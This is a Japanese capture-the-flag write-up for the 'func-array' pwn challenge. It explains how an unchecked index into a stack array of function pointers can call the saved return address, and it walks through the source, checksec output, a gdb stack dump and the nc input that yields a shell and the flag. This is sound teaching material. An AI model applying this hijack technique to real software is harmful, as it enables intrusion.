---
title: Daily-AlpacaHack 「func-array」Easy
description: Out-of-Bounds Read
date: 2026-05-26 17:33:00 +0900
categories: [CyberSecurity, CTF]
tags: [daily_alpaca_hack, linux, pwn]
---

# 20260525-daily_alpaca-pwn-func_array

> - **Category**: pwn
> - **Description**: アルパカ関数ポインタの配列 🦙🦙🦙🦙🦙
> - **Keyword**: `Out-of-Bounds Read`
> - **Tech Stack**: C, nasm
{: .prompt-info }

**階層構造**
```
.
├── chal
├── chal.c
├── compose.yaml
├── Dockerfile
└── flag.txt

1 directory, 5 files
```

---
## Solution Path

`PIE: No PIE (0x400000)` と記載があるので，このプログラムはどの環境で実行しても，各関数は `0x400000` を基準とした固定のアドレスに配置されます．

**バイナリ保護の確認**
```shell
$ checksec --file=chal 
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

このプログラムには，典型的な **Out-of-Bounds Read (配列の境界外読み取り)** の脆弱性があります．

C言語はデフォルトで，**インデックスの境界値チェック** がされません．
**alpaca_functions** 配列の範囲 (`0≦i≦2`) を超えた大きな数字を入力すると，プログラムは配列の外側にあるスタック領域を **関数ポインタ** として無理やり参照し，そこに書かれているアドレスへジャンプしようとします．

`chal.c`
```c
#include <stdio.h>
#include <stdlib.h>

void alpaca_function0() {
	puts("Alpaca Function 0.");
}

void alpaca_function1() {
	puts("Alpaca Function 1. 🦙");
}

void alpaca_function2() {
	puts("Alpaca Function 2. 🦙🦙");
}

void win() {
	asm volatile("mov $0,%spl");
	puts("You Win! 🦙🦙🦙🦙🦙");
	system("/bin/sh");
	exit(0);
}

void vuln() {
	void (*alpaca_functions[3])() = {
		alpaca_function0,
		alpaca_function1,
		alpaca_function2};

	unsigned int choice;
	printf("Select an alpaca function index: ");
	scanf("%u", &choice);

	alpaca_functions[choice]();

	exit(0);
}

int main() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

	vuln();

	win();

	return 0;
}
```

### スタック領域

`vuln` 関数が実行されるとき，スタック領域には `alpaca_functions` 配列，変数 `choice` が存在します．
そして関数が終わったときの戻り先である `saved rbp` や `saved rip` (リターンアドレス) が並んで配置されます．

もし，`choice` に，`3` や `4`，あるいはより大きな値を入れると，メモリ上で以下のように範囲外を参照してしまいます．

- `alpaca_functions[0]` ＝ `alpaca_function0` のアドレス
- `alpaca_functions[1]` ＝ `alpaca_function1` のアドレス
- `alpaca_functions[2]` ＝ `alpaca_function2` のアドレス
- `alpaca_functions[3]` ＝ **配列の外 (隣にある別のローカル変数などの領域)**
- `alpaca_functions[4]` ＝ **`saved rbp` の領域**
- `alpaca_functions[5]` ＝ **`saved rip` つまりリターンアドレスの領域**

> 実際の並び順や正確なインデックス番号は，コンパイラが変数をどの順序でスタックに配置したかによって前後します．
{: .prompt-info }

重大な点として，配列外メモリ参照に加えて，その関数を `alpaca_functions[choice]()` としてその中身をコールしているため，スタック領域の任意の関数を呼び出すことが可能な設計になっています．

### 実際にスタック領域の並びを確認

`vuln()` において，`call   *%rdx` の部分にブレークポイントを張り，スタック領域にどのようにアドレスが並んでいるかを確認します．

```shell
$ gdb ./chal

(gdb) starti

(gdb) disas vuln
Dump of assembler code for function vuln:
#...
   0x00000000004012d1 <+122>:   call   *%rdx # alpaca_functionsのコール
   0x00000000004012d3 <+124>:   mov    $0x0,%edi
   0x00000000004012d8 <+129>:   call   0x4010e0 <exit@plt>
End of assembler dump.

(gdb) b *0x00000000004012d1

(gdb) x/12gx $rbp-0x40
0x7fffffff6dd0: 0x00007fffffff6e10      0x00000000004012c2
0x7fffffff6de0: 0x00007ffff7feac68      0x0000000200000000
0x7fffffff6df0: 0x00000000004011d6      0x00000000004011f0
0x7fffffff6e00: 0x000000000040120a      0x055764323914cb00
0x7fffffff6e10: 0x00007fffffff6e20      0x000000000040132b
0x7fffffff6e20: 0x00007fffffff6ec0      0x00007ffff762b285

(gdb) p *alpaca_function0
$2 = {<text variable, no debug info>} 0x4011d6 <alpaca_function0>

(gdb) p *alpaca_function1
$3 = {<text variable, no debug info>} 0x4011f0 <alpaca_function1>

(gdb) p *alpaca_function2
$4 = {<text variable, no debug info>} 0x40120a <alpaca_function2>
```

```shell
$ nc <ip> <port>
Select an alpaca function index: 5
You Win! 🦙🦙🦙🦙🦙
cat flag.txt
{*** REDACTED ***}
```

---
## Post-Mortem & Dead ends

PS. よく見たら，地味にアルパカの数が攻略ヒントになってますね．

## References
